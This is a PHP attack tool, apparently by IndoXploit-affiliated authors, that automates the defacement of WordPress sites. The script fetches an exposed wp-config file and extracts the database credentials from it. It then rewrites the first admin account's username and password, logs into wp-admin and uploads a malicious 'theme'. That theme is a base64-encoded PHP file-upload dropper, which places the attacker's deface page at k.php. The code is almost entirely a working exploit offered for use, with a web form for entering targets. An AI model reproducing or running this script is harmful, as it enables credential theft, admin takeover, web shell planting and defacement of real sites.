<?php
// Tu5b0l3d
// thx to: IndoXPloit, HNc
// Wordpress Auto Deface Melalui link Config.

error_reporting(0);
	if($_POST){

		function ambilKata($param, $kata1, $kata2){
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

	function anucurl($sites){
		$ch1 = curl_init ("$sites");
curl_setopt ($ch1, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch1, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch1, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch1, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch1, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch1, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch1, CURLOPT_COOKIEFILE,'coker_log');
$data = curl_exec ($ch1);
return $data;
	}

	function lohgin($cek, $web, $userr, $pass, $wp_submit){
		$post = array(
					"log" => "$userr",
					"pwd" => "$pass",
					"rememberme" => "forever",
					"wp-submit" => "$wp_submit",
					"redirect_to" => "$web",
					"testcookie" => "1",
					);
$ch = curl_init ("$cek");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data6 = curl_exec ($ch);
return $data6;
	}

		$link = $_POST['link'];
		$script = $_POST['script'];
		if($script==""){
			echo "<center><h1>Isi Dulu Hacked By</h1></center>";
		}
		else{

		$file = anucurl($link);

		$host = ambilkata($file,"DB_HOST', '","'");
					$username = ambilkata($file,"DB_USER', '","'");
					$password = ambilkata($file,"DB_PASSWORD', '","'");
					$db = ambilkata($file,"DB_NAME', '","'");
					$dbprefix = ambilkata($file,"table_prefix  = '","'");
					$user_baru = "Tu5b0l3d";
					$password_baru = "Tu5b0l3d";
					$prefix = $db.".".$dbprefix."users";
					$sue = $db.".".$dbprefix."options";
					$pass = md5("$password_baru");
					


					echo "# Db Host: $host<br>";
					echo "# Db user: $username<br>";
					echo "# Db Password: $password<br>";
					echo "# Db name: $db<br>";
					echo "# Table_Prefix: $dbprefix<br>";		

		mysql_connect($host,$username,$password);
		mysql_select_db($db);

		$tampil=mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
   		$r=mysql_fetch_array($tampil);
        $id = $r[ID];

        $tampil2=mysql_query("SELECT * FROM $sue ORDER BY option_id ASC");
   		$r2=mysql_fetch_array($tampil2);
        $target = $r2[option_value];
         echo "# $target<br>";
        
        
        

         mysql_query("UPDATE $prefix SET user_pass='$pass',user_login='$user_baru' WHERE ID='$id'");




$site= "$target/wp-login.php";
$site2= "$target/wp-admin/theme-install.php?upload";
$b1 = anucurl($site2);
$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
echo "# site2-> $site2\n# wp-submit -> $wp_sub<br>";

$b = lohgin($site, $site2, $user_baru, $password_baru, $wp_sub);

//$b = anucurl($site2);

$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
echo "# token -> $anu2<br>";


$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");

$www = "m.php";
$fp5 = fopen($www,"w");
fputs($fp5,$upload3);
    
  $post2 = array(
					"_wpnonce" => "$anu2",
					"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
					"themezip" => "@$www",
					"install-theme-submit" => "Install Now",
					);
$ch = curl_init ("$target/wp-admin/update.php?action=upload-theme");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post2);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);

$y = date("Y");
$m = date("m");

$namafile = "id.php";
$fpi = fopen($namafile,"w");
fputs($fpi,$script);

$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
curl_setopt($ch6, CURLOPT_POST, true);
curl_setopt($ch6, CURLOPT_POSTFIELDS,
array('file3'=>"@$namafile"));
curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch6, CURLOPT_COOKIEFILE, "coker_log");
$postResult = curl_exec($ch6);
curl_close($ch6);

$as = "$target/k.php";
$bs = anucurl($as);
 if(preg_match("#hacked#si",$bs)){
                        echo "# <font color='green'>berhasil mepes...</font><br>";
                        echo "# $as<br>";
                       
                    }
                    else{
                        echo "# <font color='red'>gagal mepes...</font><br>";
                        echo "# coba aja manual: <br>";
                        echo "# $target/wp-login.php<br>";
                        echo "# username: $user_baru<br>";
                        echo "# password: $password_baru<br>";

                       
                    }
                }




	}else{
			echo '<html>
	<head>
		<title>Created By IndoXploit Just For Wordpress</title>
	</head>

	<body>
			<center>
				<font face="arial"><h2>INDO<font color="red">}{</font>PLOIT <br><br> Wordpress Auto Deface </h2><hr></font>
						<table>
							<tr><td><form method="post" action="?action"></td></tr>
							<tr><td><input type="text" name="link" placeholder="link config"></td></tr>
							<tr><td><input type="text" name="script" placeholder="Hacked By Tu5b0l3d"> //Must Hacked</td></tr>

							<tr><td><input type="submit" value="Submit"></td></tr>
							</form>
						</table>
						
			</center>

	</body>
</html>';
		}

?>
